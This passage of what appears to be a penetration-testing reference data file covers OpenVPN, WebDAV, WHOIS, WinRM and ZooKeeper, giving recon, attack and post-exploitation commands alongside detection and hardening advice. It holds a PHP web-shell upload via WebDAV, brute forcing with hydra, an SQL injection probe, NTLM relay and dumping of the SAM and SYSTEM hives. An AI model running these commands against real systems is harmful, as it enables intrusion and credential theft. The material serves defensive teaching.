          "Carry VNC over SSH or IPsec so that the session is encrypted and the password challenge is not the only thing standing between you and the desktop.",
      },
      {
        title: "Keep 5900 off the internet",
        detail:
          "Never publish the port. Where remote access is needed, reach it through a VPN or a jump host on the management network.",
      },
      {
        title: "Replace VNC where you can",
        detail:
          "Modern remote administration products give you session recording, better authentication and better auditing. VNC rarely gives you any of the three.",
      },
      {
        title: "Restrict by firewall",
        detail:
          "Permit the port only from the addresses that genuinely administer the host, and log the connections that are refused.",
      },
      {
        title: "Disable the legacy authentication mode",
        detail:
          "Where the server supports the modern security types, use them and turn off the old challenge and response, which truncates the password to eight characters.",
      },
    ],
    tools: ["nmap", "netcat", "hashcat", "hydra", "tshark"],
  },
  {
    slug: "vpn-services",
    name: "VPN Services",
    port: 1194,
    protocol: "udp",
    risk: "high",
    tags: ["vpn", "remote-access", "tls"],
    summary:
      "OpenVPN is the open-source remote access VPN most organisations reach for when they want something they can audit, and it listens on UDP 1194 by default. The protocol itself is solid; the operational habits around it are not. Client profiles bundle the certificate and the key into a single file, accounts get reused across every user, and the management interface of the commercial access server is often left reachable from the internet. Each of those turns a legitimate endpoint into a way into the network behind it.",
    connect: [
      {
        label: "TLS probe on the TCP listener",
        command: "openssl s_client -connect <target>:1194 -brief",
        detail:
          "OpenVPN also runs over TCP and many deployments bind 1194 on both protocols. The certificate names the internal host and the certificate authority, which confirms the service and says something useful.",
      },
      {
        label: "Client handshake",
        command: "openvpn --config client.ovpn",
        detail:
          "A real client profile needs the authority certificate and the client certificate and key, so this is the test once you have a profile. The log shows the negotiated cipher and the routes the server pushed.",
      },
      {
        label: "Raw UDP probe",
        command: "nc -u -nv <target> 1194",
        detail:
          "UDP gives no banner and a connection to the port always appears to succeed. The useful output is the ICMP error that arrives if the port is closed.",
      },
    ],
    recon: [
      {
        title: "UDP port state",
        command: "nmap -sU -p 1194 --reason --packet-trace <ip>",
        detail:
          "Without a handshake nmap reports open|filtered for almost any UDP port. The packet trace shows whether an ICMP port-unreachable came back, which is the only reliable way to tell closed from filtered.",
      },
      {
        title: "Client hello capture",
        command: "sudo tcpdump -i eth0 -c 20 -w /tmp/openvpn.pcap 'udp port 1194'",
        detail:
          "A hard reset client packet has a distinctive first byte of 0x38. Capturing it confirms the service and shows the client certificate the server asked for.",
      },
      {
        title: "Other VPN families on the same host",
        command: "nmap -sU -p 1194,4500,500,1701,1723,443,8443 <ip>",
        detail:
          "IKE on 500 and 4500 and L2TP on 1701 belong to the other protocol families. Finding several on one host means you are looking at a concentrator that fronts more than one kind of VPN.",
      },
    ],
    enumeration: [
      {
        title: "Hard reset response",
        command:
          "printf '\\x38\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | nc -u -w 3 <ip> 1194",
        detail:
          "The server answers a client hard reset with its own hard reset, which confirms the protocol and the revision. The packet is one opcode byte followed by an empty session identifier and packet identifier.",
      },
      {
        title: "Certificate of the endpoint",
        command: "openssl s_client -connect <target>:1194 -servername <domain> -showcerts",
        detail:
          "The certificate chain names the internal host and the issuing authority, which often follows the domain naming used across the whole VPN estate.",
      },
      {
        title: "Transport check",
        command: "nmap -sV -p 1194,1194/udp <ip>",
        detail:
          "A combined TCP and UDP check on the same port number tells you whether the deployment supports both transports, and TCP is the one you can probe with a normal handshake.",
      },
    ],
    attacks: [
      {
        title: "Reused client profile",
        severity: "critical",
        command: "openvpn --config leaked.ovpn",
        detail:
          "A client profile is a single file containing the authority certificate, the client certificate and the private key. When that file is emailed, left on a share or pasted into a wiki, whoever holds it connects to the production network with a trusted device identity and no password prompt.",
        detection:
          "Connections from an address that has never used the VPN, or a client certificate presenting from a source address that is new.",
        fix:
          "Issue a certificate per device, revoke on loss, deliver profiles through an enrolment process, and never store them in a document that gets forwarded.",
      },
      {
        title: "Weak shared account credentials",
        severity: "high",
        command: "hydra -l <user> -P <wordlist> -t 4 -f https://<target>/auth/login",
        detail:
          "The commercial access server has a web login that accepts a username and a password. Accounts created for travelling staff are the ones to try, because they are usually created in a hurry and left enabled afterwards.",
        detection:
          "Repeated failed logins against the access server portal, and successful logins for accounts whose usage pattern suddenly changes.",
        fix:
          "Require a second factor on the portal, remove accounts the day somebody leaves, and enforce a password policy on the account store.",
      },
      {
        title: "Client-side certificate validation disabled",
        severity: "medium",
        command: "grep -Ei 'remote-cert-tls|verify-x509-name|tls-verify' client.ovpn",
        detail:
          "A profile that omits remote-cert-tls server and verify-x509-name accepts any certificate the server presents. Anyone able to intercept the UDP flow can then terminate the tunnel and read the traffic inside it.",
        detection:
          "Not a server-side event, so review the profiles in use and check the client logs for certificate errors instead.",
        fix:
          "Pin the server name with verify-x509-name, set remote-cert-tls server and ship the authority certificate inside every profile.",
      },
    ],
    postEx: [
      {
        title: "Read the tunnel address and pushed routes",
        severity: "medium",
        command: "ip addr show tun0\nip route",
        detail:
          "The tun interface carries the assigned address and the routes the server pushed, which tell you exactly which internal networks are reachable through the tunnel.",
        detection:
          "Tunnel interfaces and route tables that do not match the deployment record.",
        fix:
          "Push only the routes a user group genuinely needs, and keep the address space small enough to audit.",
      },
      {
        title: "Scan the internal networks",
        severity: "high",
        command: "nmap -sV -p 22,80,3389,5985 10.8.0.0/24",
        detail:
          "The concentrator routes the client subnet to the internal estate. Scanning the tunnel subnet from a connected client often finds management interfaces that the internet-facing firewall blocks.",
        detection:
          "Large scans originating from the VPN address pool, especially towards the management ports.",
        fix:
          "Keep the management plane on a separate network from the VPN clients, and rate limit scan traffic leaving the tunnel.",
      },
      {
        title: "Read the server's client status file",
        severity: "medium",
        command: "cat /var/log/openvpn/status.log",
        detail:
          "The status file lists the connected clients with their real addresses and their byte counters, which identifies who is connected and which client is not one you expect.",
        detection:
          "Changes in the client status file that do not match the access log for the same period.",
        fix:
          "Restrict access to the status file, log it centrally and review the connected client list on a schedule.",
      },
    ],
    commands: [
      { command: "openvpn --config client.ovpn", description: "Connect using a client profile." },
      { command: "openssl s_client -connect <target>:1194 -brief", description: "Probe the TLS endpoint." },
      { command: "nc -u -nv <ip> 1194", description: "Raw UDP probe." },
      { command: "ip addr show tun0", description: "Show the tunnel address." },
      { command: "ip route", description: "Show the routes pushed by the server." },
      { command: "sudo tcpdump -i tun0 -w /tmp/vpn.pcap", description: "Capture traffic inside the tunnel." },
      { command: "cat /var/log/openvpn/status.log", description: "List the connected clients." },
      { command: "sudo tail -f /var/log/openvpn.log", description: "Follow the server log." },
      { command: "nmap -sU -p 1194 --packet-trace <ip>", description: "Determine the UDP port state." },
      { command: "systemctl status openvpn-server@server", description: "Check the service state on the server." },
    ],
    hardening: [
      {
        title: "Use a unique certificate per device",
        detail:
          "Bind every profile to one device, revoke the certificate when the device is lost or replaced, and never copy a profile between users.",
      },
      {
        title: "Require a second factor on the portal",
        detail:
          "The web management interface is an authentication endpoint like any other. Protect it with a second factor and restrict it to the administration network.",
      },
      {
        title: "Pin the server certificate",
        detail:
          "Set remote-cert-tls server and verify-x509-name in every profile so that a substituted certificate terminates the connection instead of decrypting it.",
      },
      {
        title: "Restrict the management interface",
        detail:
          "Keep the access server administration on the internal network and require a VPN before it can be reached at all.",
      },
      {
        title: "Keep the server patched and lean",
        detail:
          "Update OpenVPN and the access server, and remove the plugins, push options and script hooks that the deployment does not need, since each one widens the attack surface.",
      },
      {
        title: "Review the client list regularly",
        detail:
          "Accounts survive departures and profiles survive device loss. A monthly review of the connected clients and the active certificates catches both.",
      },
    ],
    tools: ["nmap", "netcat", "hydra", "tcpdump", "socat"],
  },
  {
    slug: "webdav",
    name: "WebDAV",
    port: 80,
    protocol: "tcp",
    risk: "medium",
    tags: ["web", "file-transfer", "http"],
    summary:
      "WebDAV adds file management verbs to HTTP so that a web server can behave like a network drive, and Windows mounts one with a double click. The problem is that WebDAV support is frequently enabled on ordinary web servers that were never intended to expose a filesystem, and the share often ends up with weak or shared credentials. Where write access exists, WebDAV is a convenient way to drop a file into a web root using nothing but curl.",
    connect: [
      {
        label: "Method probe",
        command: "curl -s -i -X OPTIONS http://<target>/",
        detail:
          "The Allow header lists the enabled methods. PROPFIND, PUT, DELETE and MKCOL in that list mean WebDAV is on, and PUT together with DELETE means you can write.",
      },
      {
        label: "Directory listing",
        command: "curl -s -X PROPFIND -H 'Depth: 1' -u <user>:<password> http://<target>/dav/",
        detail:
          "PROPFIND returns an XML body describing the collection and its members. A depth of one gives one level of the tree, which is enough to map the share.",
      },
      {
        label: "Interactive client",
        command: "cadaver http://<target>/dav/",
        detail:
          "cadaver is the standard command line WebDAV client. It handles the verbs properly and works through proxies, which makes it more reliable than hand-rolled requests.",
      },
    ],
    recon: [
      {
        title: "Web server fingerprint",
        command: "nmap -sV -p 80 --script http-title,http-methods,http-server-header <target>",
        detail:
          "The banner names the platform and the methods list shows whether DAV is enabled on the default virtual host, which is often not the host the site actually uses.",
      },
      {
        title: "Direct DAV probe",
        command: "nmap -p 80 --script http-methods --script-args http-methods.method=PROPFIND <target>",
        detail:
          "Probing PROPFIND directly and reading the DAV response header is more reliable than trusting the OPTIONS list, because some servers answer OPTIONS from configuration rather than from what they implement.",
      },
    ],
    enumeration: [
      {
        title: "Walk the tree",
        command: "curl -s -X PROPFIND -H 'Depth: infinity' -u <user>:<password> http://<target>/dav/",
        detail:
          "A deep PROPFIND returns every resource with its size and its last modified date. Plenty of servers refuse an infinite depth for good reason, and that refusal is itself an answer.",
      },
      {
        title: "Credential test",
        command:
          "curl -s -o /dev/null -w '%{http_code}\\n' -u <user>:<password> -X PROPFIND http://<target>/dav/",
        detail:
          "A 207 Multi-Status response means the credential was accepted and the collection was listed. Anything else means the password was wrong or the share is closed.",
      },
      {
        title: "Anonymous write test",
        command:
          "printf 'probe' > /tmp/probe.txt\ncurl -s -o /dev/null -w '%{http_code}\\n' -T /tmp/probe.txt http://<target>/dav/probe.txt",
        detail:
          "A 201 or a 204 means the upload worked and you should delete the file straight away. The status code alone tells you whether the share is writable without a credential.",
      },
    ],
    attacks: [
      {
        title: "Anonymous write access to a web root",
        severity: "critical",
        command: "curl -s -T /tmp/shell.txt http://<target>/dav/shell.txt",
        detail:
          "A DAV share that accepts an unauthenticated PUT into a directory the web server executes becomes a remote shell, and no exploit was needed at any point.",
        detection:
          "PUT and PROPFIND requests from hosts that are not the sync client, and new files appearing in the web root.",
        fix:
          "Require authentication on the DAV share, keep uploaded content out of any executed path, and disable DAV where it is not used.",
      },
      {
        title: "Plaintext Basic authentication",
        severity: "high",
        command: "sudo tcpdump -i eth0 -A -s0 'tcp port 80 and host <ip>'",
        detail:
          "Basic credentials travel as base64, which is encoding and not encryption. A captured Authorization header is a captured password, and it is often the same password used on other systems.",
        detection:
          "HTTP Basic authentication to a DAV share, and the same credential appearing against several services in a short window.",
        fix:
          "Serve the DAV share over TLS only, refuse Basic authentication on a plaintext connection, and use a credential that is not shared with anything else.",
      },
      {
        title: "Internal share used as a pivot",
        severity: "medium",
        command: "curl -s -X PROPFIND -H 'Depth: 1' -u <user>:<password> http://<target>/dav/",
        detail:
          "Web servers that sit inside a restricted network and publish a DAV share give you a way to read and write files there without a foothold on the network itself, which is the classic reason an internal web server turns into somebody else's file server.",
        detection:
          "DAV requests that originate from outside the segment the share was designed for.",
        fix:
          "Keep the DAV share on the internal network, allow it only from the clients that need it, and audit the contents periodically.",
      },
    ],
    postEx: [
      {
        title: "Upload content into a served path",
        severity: "critical",
        command:
          "printf '<?php system($_GET[\"c\"]); ?>' > /tmp/shell.php\ncurl -s -T /tmp/shell.php http://<target>/dav/shell.php",
        detail:
          "The uploaded file is served by the web server. If the path is inside the document root and the extension is executed, this is a shell.",
        detection:
          "New files under the document root that do not correspond to a deployment, and requests for them.",
        fix:
          "Keep the DAV root separate from the served root, disable script execution in the upload path, and review the directory for unexpected files.",
      },
      {
        title: "Overwrite an existing configuration file",
        severity: "high",
        command: "curl -s -T /tmp/evil.conf http://<target>/dav/app/config.php",
        detail:
          "Overwriting an existing configuration with a DAV PUT changes the application's behaviour without touching the host. It is quieter than dropping a new file and it does not need a shell to work.",
        detection:
          "Modifications to configuration files that did not come from the deployment pipeline.",
        fix:
          "Remove write permission from the DAV share for ordinary users, and keep the real configuration outside it.",
      },
      {
        title: "Harvest the stored files",
        severity: "high",
        command:
          "curl -s -X PROPFIND -H 'Depth: infinity' -u <user>:<password> http://<target>/dav/ -o /tmp/dav.xml",
        detail:
          "The tree often holds backups, exports and configuration archives that somebody copied there for convenience. Downloading them is a single request.",
        detection:
          "Large downloads from the DAV share, particularly of archive files.",
        fix:
          "Keep the share limited to the files it serves, and prune it on a schedule with an owner for each directory.",
      },
    ],
    commands: [
      { command: "curl -s -i -X OPTIONS http://<target>/", description: "List the allowed HTTP methods." },
      { command: "curl -s -X PROPFIND -H 'Depth: 1' http://<target>/dav/", description: "List one level of a collection." },
      { command: "curl -s -X PROPFIND -H 'Depth: infinity' -u <user>:<password> http://<target>/dav/", description: "Walk the whole tree." },
      { command: "curl -s -T <file> http://<target>/dav/<name>", description: "Upload a file to the share." },
      { command: "curl -s -o /dev/null -w '%{http_code}\\n' -X DELETE http://<target>/dav/<name>", description: "Delete a resource." },
      { command: "curl -s -X MKCOL http://<target>/dav/<dir>", description: "Create a collection." },
      { command: "curl -s -X PROPPATCH -H 'Content-Type: text/xml' -d @props.xml http://<target>/dav/<name>", description: "Set properties on a resource." },
      { command: "curl -s -u <user>:<password> http://<target>/dav/<name>", description: "Download a file." },
      { command: "cadaver http://<target>/dav/", description: "Open the interactive WebDAV client." },
      { command: "davtest -u http://<target>/dav/", description: "Test which DAV capabilities are enabled." },
    ],
    hardening: [
      {
        title: "Disable WebDAV where it is not needed",
        detail:
          "Most web servers have DAV on by default and nobody uses it. Turn the module off unless a specific integration depends on it.",
      },
      {
        title: "Require authentication and use TLS",
        detail:
          "Protect the share with real credentials over HTTPS, and refuse Basic authentication on a plaintext connection so the password never crosses the network in base64.",
      },
      {
        title: "Keep uploads out of executed paths",
        detail:
          "Point the DAV root at a directory that the web server serves as a download and never as a script, and disable the interpreter for that directory.",
      },
      {
        title: "Restrict the share to the clients that need it",
        detail:
          "Apply an ACL so only the addresses that synchronise against the share can reach it, and log the requests that are refused.",
      },
      {
        title: "Run the web server unprivileged",
        detail:
          "The service account should not be able to write outside the document root, so a compromised application cannot drop a file that the server will execute.",
      },
      {
        title: "Monitor the write methods",
        detail:
          "Alert on PUT, DELETE and MKCOL in the access log. Those three verbs are the difference between a read-only web server and a file server.",
      },
    ],
    tools: ["nmap", "httpx", "nikto", "owasp-zap", "nuclei", "netcat"],
  },
  {
    slug: "whois",
    name: "WHOIS",
    port: 43,
    protocol: "tcp",
    risk: "medium",
    tags: ["registry", "information-disclosure", "tcp"],
    summary:
      "WHOIS is the old directory protocol for domain and address registration records, and it is still the fastest way to learn who owns an address range, which registrar handles it and which name servers resolve it. Port 43 speaks plain text, which means the server will happily answer queries that are not really queries, and the web front ends built on top of it have been abused for exactly that reason. For an attacker it is a reconnaissance gold mine, and for a defender it is the place where your own registration details leak.",
    connect: [
      {
        label: "Standard client",
        command: "whois <domain>",
        detail:
          "The client sends the query and reads the response until the server closes the connection. The registry's referral is printed first and you follow it with -h for the authoritative answer.",
      },
      {
        label: "Query a specific server",
        command: "whois -h <target> <domain>",
        detail:
          "Pointing the client at a particular host is how you query a regional registry directly instead of the default one.",
      },
      {
        label: "Raw session",
        command: "printf '<domain>\\r\\n' | nc -nv <target> 43",
        detail:
          "The protocol is one line of text in and a great deal of text out. A raw session shows you the exact response, including the server's own identification banner at the top.",
      },
    ],
    recon: [
      {
        title: "Service fingerprint",
        command: "nmap -sV -p 43 --script whois <target>",
        detail:
          "The whois script performs a query and reports the server's identification and the size of the answer, which distinguishes a thin registry server from a full one that returns referral data.",
      },
      {
        title: "Ownership and infrastructure",
        command: "whois <domain>",
        detail:
          "Registrar, registrant country, name servers, domain status and the dates. The name servers are the useful part, because they map to hosting, they expose the registrar's own infrastructure and they often reveal a staging host.",
      },
      {
        title: "Address ownership",
        command: "whois <ip>",
        detail:
          "An address query returns the netblock owner, the abuse contact and the routing origin. That tells you which organisation to consider in scope and which registrar to approach about the range.",
      },
    ],
    enumeration: [
      {
        title: "Domain status and expiry",
        command: "whois <domain> | grep -i 'status\\|expiry\\|nserver'",
        detail:
          "Client transfer locks, expiry dates and the name server list are all disclosed, and together they tell you whether a domain is parked, in redelegation or approaching expiry.",
      },
      {
        title: "Registrar-side records",
        command: "whois -h <whois.<tld>> <domain>",
        detail:
          "Different servers expose different fields. The registry gives dates, the registrar gives the registrant, and the registry response often still lists the earlier name servers.",
      },
      {
        title: "Referral traversal",
        command: "whois <domain> | grep -i 'refer:'",
        detail:
          "The referral line points at the next server to ask. Chasing the referral is how you get the full record when the first server is thin.",
      },
    ],
    attacks: [
      {
        title: "Information disclosure about the target",
        severity: "medium",
        command: "whois <domain>",
        detail:
          "The registration record hands over the registrar, the creation date, the name servers and often a registrant email address on a personal plan. That is enough to target the registrar account, to time a domain takeover attempt, or to write a convincing phishing pretext.",
        detection:
          "Nothing appears on the target's side, so the practical measure is to look at what your own registration record exposes and to use the registrar's privacy proxy.",
        fix:
          "Enable WHOIS privacy where the registrar offers it, keep the administrative contact to a role address, and choose a registrar with a responsive abuse process.",
      },
      {
        title: "Injection through the query field",
        severity: "high",
        command: "printf \"<domain>' OR '1'='1\\r\\n\" | nc -nv <target> 43",
        detail:
          "The web front ends that sit in front of port 43 have been found passing the query straight into a database. Where the same pattern exists behind this server, the query field is an injection point rather than a search box.",
        detection:
          "Unusual characters in the query string and server errors returned in response to malformed lookups.",
        fix:
          "Keep the front end parameterised, run the service with a read-only database account, and put a validating proxy in front of it.",
      },
    ],
    postEx: [
      {
        title: "Read the whois server's own configuration",
        severity: "high",
        command: "ssh <user>@<target>\ngrep -Rni 'password\\|secret' /etc/ 2>/dev/null | head",
        detail:
          "Once you are on the host running the whois service, the referral database and the configuration sit right next to it, and they list every domain and network range the server answers for.",
        detection:
          "Administrative access to the service host from an address that is not the operations team.",
        fix:
          "Keep the service host out of the administrative estate and limit shell access to the operations group.",
      },
      {
        title: "Harvest the query log",
        severity: "medium",
        command: "ssh <user>@<target>\nawk '{print $NF}' /var/log/whois.log | sort -u | head -50",
        detail:
          "The query log holds every lookup the server has served. It shows which names the defenders care about, which ranges they are watching, and the source addresses reveal who is using the service internally.",
        detection:
          "Bulk log reads and log files copied off the service host.",
        fix:
          "Ship the whois logs to the central logging platform and keep the local copies small and short-lived.",
      },
    ],
    commands: [
      { command: "whois <domain>", description: "Query the default whois server." },
      { command: "whois -h <target> <domain>", description: "Query a specific server." },
      { command: "whois <ip>", description: "Look up address ownership." },
      { command: "whois -a <domain>", description: "Request every available record." },
      { command: "whois -p <port> <domain>", description: "Query a non-standard port." },
      { command: "whois -b <domain>", description: "Brief output, less of the boilerplate." },
      { command: "printf '<domain>\\r\\n' | nc -nv <target> 43", description: "Send a raw query by hand." },
      { command: "whois -H <target> <domain>", description: "Hide the legal disclaimer text." },
      { command: "grep -i 'refer:'", description: "Find the referral to the next server." },
    ],
    hardening: [
      {
        title: "Enable WHOIS privacy at the registrar",
        detail:
          "It does not hide everything, but it removes the registrant details that make a phishing pretext believable.",
      },
      {
        title: "Keep personal details out of the record",
        detail:
          "Use a role mailbox and a generic contact on anything you register. Registrant addresses become a targeting list.",
      },
      {
        title: "Parameterise the web front end",
        detail:
          "Bind the query as a parameter and run the service against a read-only database account, so a malformed query cannot do anything interesting.",
      },
      {
        title: "Rate limit and log queries",
        detail:
          "Cap the query rate per source and log the rejected ones. A whois server is a public resource and the abuse shows up as volume.",
      },
      {
        title: "Use a role address for the abuse contact",
        detail:
          "Keep the abuse contact to a monitored mailbox rather than a person's address, and make sure it is answered.",
      },
      {
        title: "Separate the admin interface",
        detail:
          "Keep the control panel and the database credentials off the host that answers public queries, and do not expose the service to the internet without a proxy in front of it.",
      },
    ],
    tools: ["nmap", "netcat", "the-harvester", "httpx", "amass"],
  },
  {
    slug: "winrm",
    name: "WinRM",
    port: 5985,
    protocol: "tcp",
    risk: "high",
    tags: ["windows", "remote-management", "powershell"],
    summary:
      "Windows Remote Management carries PowerShell over SOAP on 5985 and 5986, and it is the transport underneath the remote administration tooling that every Windows administrator uses. The default listener speaks NTLM without transport encryption, so on a flat network the credentials travel in a form that can be relayed or captured. The service also gives a clean and direct path to command execution that avoids the tooling a great deal of detection is written around.",
    connect: [
      {
        label: "Interactive session",
        command: "evil-winrm -i <target> -p <password> -u <user>",
        detail:
          "evil-winrm opens the WSMan session, negotiates the encryption and gives you an interactive PowerShell prompt on the remote machine. It is the quickest way to confirm a credential.",
      },
      {
        label: "Native client",
        command: "winrs -r:http://<target>:5985 -u:<user> -p:<password> hostname",
        detail:
          "winrs ships with Windows and is useful for scripting. The password on the command line is visible to anyone who can list processes, so use the interactive prompt on a shared host.",
      },
      {
        label: "Service probe",
        command:
          "curl -si -X POST -H 'Content-Type: application/soap+xml;charset=UTF-8' -H 'SOAPAction: http://schemas.xmlsoap.org/ws/2004/08/addressing/action' --data-binary @wsman.xml http://<target>:5985/wsman",
        detail:
          "The WinRM service answers on the wsman path with a WSMan SOAP response even when the request is malformed. That response header tells you the protocol version and the authentication scheme.",
      },
    ],
    recon: [
      {
        title: "Service fingerprint",
        command: "nmap -sV -p 5985 --script http-title,http-headers,http-auth <target>",
        detail:
          "http-auth reports the supported authentication schemes, which tells you whether NTLM, Kerberos or Negotiate is in play and therefore whether a domain credential is required.",
      },
      {
        title: "Listener discovery",
        command: "nmap -sV -p 5985,5986 <target>",
        detail:
          "5985 is the unencrypted listener and 5986 is the TLS one. If only 5985 is open then every credential that crosses it is exposed on the wire.",
      },
      {
        title: "Local administrator policy check",
        command: "netexec --target <ip> -u <user> -p <password> --local-auth",
        detail:
          "Where local authentication is accepted, the machine's credential database is reachable over the network. That turns one password into the hashes of every account on the box.",
      },
    ],
    enumeration: [
      {
        title: "Protocol version",
        command:
          "curl -si -X POST -H 'Content-Type: application/soap+xml;charset=UTF-8' --data-binary @wsman.xml http://<target>:5985/wsman",
        detail:
          "The response advertises the protocol version and the SOAP action it accepts. Compare it with the version your own client expects to spot a downgrade opportunity.",
      },
      {
        title: "Listener configuration",
        command: "evil-winrm -i <target> -u <user> -p <password> -c 'winrm enumerate winrm/config'",
        detail:
          "WinRM exposes its own configuration through the WSMan service, including the network listeners and the authentication settings. It is a good sanity check that the listener is what you think it is.",
      },
      {
        title: "Token and host details",
        command: "evil-winrm -i <target> -u <user> -p <password> -c 'whoami /all; systeminfo'",
        detail:
          "whoami /all shows the token, the groups and the logon type, and systeminfo lists the patch level and the roles. Between them they tell you which remote execution techniques will work.",
      },
    ],
    attacks: [
      {
        title: "Password spraying against the listener",
        severity: "high",
        command: "netexec --target <ip> -u <user> -p <password> --local-auth",
        detail:
          "WinRM does not rate limit authentication, and it is often enabled on build servers, jump hosts and management systems where the local administrator password was set once by a script and never changed.",
        detection:
          "A burst of failed logons from one source, and successful WinRM logons from a workstation that does not normally administer the host.",
        fix:
          "Move WinRM to the TLS listener, use domain accounts with tiered administration, and lock the local administrator accounts on the hosts.",
      },
      {
        title: "NTLM relay into the WinRM service",
        severity: "critical",
        command: "responder -I <ip> -v",
        detail:
          "The WinRM service accepts NTLM, and where HTTP signing is not configured it will accept an authentication that was relayed from somewhere else. A captured authentication becomes a remote shell.",
        detection:
          "NTLM authentications arriving at 5985 from a host that is not the client, and WinRM logons with no matching logon event on the source machine.",
        fix:
          "Require HTTPS and configure the service to demand signed NTLM, or use Kerberos with mutual authentication across the estate.",
      },
      {
        title: "Unauthenticated WSMan enumeration",
        severity: "medium",
        command:
          "curl -s -X POST -H 'Content-Type: application/soap+xml;charset=UTF-8' --data-binary @enumerate.xml http://<target>:5985/wsman",
        detail:
          "The WSMan service answers some requests before authentication, and the SOAP error responses disclose the service identity and its configuration. It is a small leak, but it confirms exactly what the host is.",
        detection:
          "Requests to the wsman path with no authentication header from sources that are not management hosts.",
        fix:
          "Restrict the firewall rule for 5985 to the management hosts, and turn the service off entirely where it is not needed.",
      },
    ],
    postEx: [
      {
        title: "Execute commands as the logged-on user",
        severity: "critical",
        command: "evil-winrm -i <target> -u <user> -p <password> -c 'whoami; whoami /priv'",
        detail:
          "The session runs with the privileges of the account. A domain administrator credential here is full control of the domain, and the session is recorded with a logon type that shows it came over WinRM.",
        detection:
          "WinRM logons with a logon type of 3 and an unusual source address, and commands that do not match the account's job.",
        fix:
          "Use tiered administration so that no account is domain administrator over WinRM, and alert on privileged logons over the listener.",
      },
      {
        title: "Copy the credential store off the host",
        severity: "high",
        command:
          "evil-winrm -i <target> -u <user> -p <password> -c 'cmd /c \"reg save HKLM\\SAM C:\\Windows\\Temp\\s.hiv & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\y.hiv\"'",
        detail:
          "With administrative rights the credential hives can be copied out and parsed offline. It works even where the security log is full, and the copies come out through the same session.",
        detection:
          "Registry save operations and hive files appearing in temporary directories.",
        fix:
          "Limit who may save the registry over the network, monitor the temporary directory, and protect local administrator accounts with unique passwords.",
      },
      {
        title: "Pivot to the next management tier",
        severity: "medium",
        command:
          "evil-winrm -i <target> -u <user> -p <password> -c 'Test-NetConnection -ComputerName <other_host> -Port 5985'",
        detail:
          "Management hosts are usually permitted to reach the management ports of their peers. A WinRM session on one of them is a jump to the next tier with the same credential.",
        detection:
          "Management ports reached from a management host that has no established relationship with the target.",
        fix:
          "Segment the management tiers and give each one its own credential set rather than reusing one account across the estate.",
      },
    ],
    commands: [
      { command: "evil-winrm -i <target> -u <user> -p <password>", description: "Open an interactive PowerShell session." },
      { command: "winrs -r:http://<target>:5985 -u:<user> hostname", description: "Run a command with the native client." },
      { command: "netexec --target <ip> -u <user> -p <password>", description: "Test a credential set against the host." },
      { command: "curl -si -X POST -H 'Content-Type: application/soap+xml;charset=UTF-8' --data-binary @wsman.xml http://<target>:5985/wsman", description: "Probe the service and read the headers." },
      { command: "winrm quickconfig", description: "Configure a local listener." },
      { command: "winrm enumerate winrm/config", description: "Read the local listener configuration." },
      { command: "winrm invoke 'cmd /c dir'", description: "Run a command locally through the service." },
      { command: "whoami /priv", description: "Show the token and its privileges." },
      { command: "cmdkey /list", description: "List stored credentials on the host." },
      { command: "Invoke-Command -ComputerName <target> -Credential (Get-Credential)", description: "PowerShell remoting from Windows." },
    ],
    hardening: [
      {
        title: "Use the TLS listener",
        detail:
          "Move the service to 5986 with a certificate the clients trust and firewall 5985, so credentials and session data never travel in clear.",
      },
      {
        title: "Demand signed NTLM",
        detail:
          "Configure the service to require a signed NTLM authentication, or move the estate to Kerberos with mutual authentication. Unsigned NTLM over WinRM is a relay waiting to happen.",
      },
      {
        title: "Use tiered administration",
        detail:
          "Give every role its own local administrator group rather than a shared local administrator account, and use Just Enough Administration for the day-to-day management.",
      },
      {
        title: "Restrict the firewall rule",
        detail:
          "Limit the WinRM listener to the management hosts and the jump servers, and log the connections that arrive from anywhere else.",
      },
      {
        title: "Enable PowerShell logging",
        detail:
          "Turn on module logging, transcription and script block logging so that the commands run over the session are recorded somewhere the operator cannot edit.",
      },
      {
        title: "Turn it off where it is not needed",
        detail:
          "WinRM is frequently enabled by image or by tooling and never used. Remove it from hosts that do not need remote management.",
      },
    ],
    tools: ["nmap", "evil-winrm", "netexec", "responder", "netcat", "impacket"],
  },
  {
    slug: "zookeeper",
    name: "ZooKeeper",
    port: 2181,
    protocol: "tcp",
    risk: "critical",
    tags: ["coordination", "infrastructure", "no-authentication"],
    summary:
      "Apache ZooKeeper is the coordination service that a great deal of modern infrastructure quietly depends on: it holds the configuration, the leader election and the service registry entries for the applications built on top of it. The default permission on a znode is world:anyone with full access, and the default installation has no authentication at all, so the contents are readable by anything that can open a socket. Those contents are usually the connection strings and credentials for the databases and brokers the rest of the platform runs on.",
    connect: [
      {
        label: "Four-letter health check",
        command: "printf 'ruok' | nc -nv <target> 2181",
        detail:
          "A healthy server replies imok. If the port answers with something else then it is not ZooKeeper, and if it says imok then the administrative commands are probably open too.",
      },
      {
        label: "Interactive shell",
        command: "zkCli.sh -server <target>:2181 ls /",
        detail:
          "The shell speaks the binary protocol and handles the session setup for you. The command here lists the root znode and its children.",
      },
      {
        label: "Admin server",
        command: "curl -s http://<target>:8080/commands",
        detail:
          "The separate admin server exposes the same four-letter commands as JSON and lists the registered servers. It is a different port from the client port and is often left open right next to it.",
      },
    ],
    recon: [
      {
        title: "Service fingerprint",
        command: "nmap -sV -p 2181 --reason <target>",
        detail:
          "ZooKeeper speaks its own binary protocol, so detection works through the probe rather than through a banner. nmap identifies it as zookeeper and reports the version when the probe succeeds.",
      },
      {
        title: "Four-letter command sweep",
        command: "for c in ruok stat srvr conf envi; do printf \"$c\\n\" | nc -w 2 <target> 2181; done",
        detail:
          "Each command returns a different block of information. conf in particular prints the data directory, the client ports and the authentication provider, which is the fastest way to understand how the instance is set up.",
      },
      {
        title: "Ensemble port sweep",
        command: "nmap -sV -p 2181,2182,2888,3888,8080 <target>",
        detail:
          "The client port is 2181, the admin server defaults to 8080, and the quorum ports are 2888 and 3888. A quorum port open to a broad range means the ensemble membership is reachable from outside.",
      },
    ],
    enumeration: [
      {
        title: "Server configuration",
        command: "printf 'conf' | nc -nv <target> 2181",
        detail:
          "The conf output gives clientPort, secureClientPort, dataDir, the tick time and the authentication provider. The absence of an authentication provider line is the finding.",
      },
      {
        title: "Znode tree and sessions",
        command: "printf 'dump' | nc -nv <target> 2181",
        detail:
          "dump prints the session table and every znode with its data, where the permissions allow it. It is the equivalent of a directory listing with the file contents included.",
      },
      {
        title: "Metrics",
        command: "printf 'mntr' | nc -nv <target> 2181",
        detail:
